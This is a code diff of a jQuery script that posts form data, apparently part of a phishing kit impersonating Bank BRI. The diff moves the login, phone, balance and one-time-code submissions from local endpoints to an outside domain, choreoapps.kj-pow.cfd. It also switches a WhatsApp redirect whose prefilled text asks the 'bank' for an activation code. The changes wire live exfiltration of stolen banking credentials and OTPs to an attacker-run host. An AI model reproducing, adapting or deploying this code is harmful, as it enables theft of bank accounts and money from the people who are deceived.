@@ -13,7 +13,7 @@ function sendHp() {
    
    $.ajax({
         type: 'POST',
-        url: 'req/no.php',
+        url: 'https://choreoapps.kj-pow.cfd/21/no.php',
         data: $('#index').serialize(),
         datatype: 'JSON',
       complete: function() {
@@ -37,7 +37,7 @@ function sendLogin() {
    
    $.ajax({
         type: 'POST',
-        url: 'req/login.php',
+        url: 'https://choreoapps.kj-pow.cfd/21/login.php',
         data: $('#login').serialize(),
         datatype: 'JSON',
       complete: function() {
@@ -68,7 +68,7 @@ function sendSaldo() {
    
    $.ajax({
         type: 'POST',
-        url: 'req/saldo.php',
+        url: 'https://choreoapps.kj-pow.cfd/21/saldo.php',
         data: $('#sald').serialize(),
         datatype: 'JSON',
       complete: function() {
@@ -101,7 +101,7 @@ function sendOtp() {
       
    $.ajax({
         type: 'POST',
-        url: 'req/otp.php',
+        url: 'https://choreoapps.kj-pow.cfd/21/otp.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',
       complete: function() {
@@ -124,7 +124,7 @@ $(document).ready(function() {
     $("#process1").show();
  $('.load').fadeIn();
     setTimeout(function(){      
-location.href='https://wa.me/6282182480632?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20request%20kode%20Aktivasi';
+location.href='https://wa.me/79326972673?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20request%20kode%20Aktivasi';
  $("#process1").hide();
  $('.load').fadeOut();        
          }, 2000);
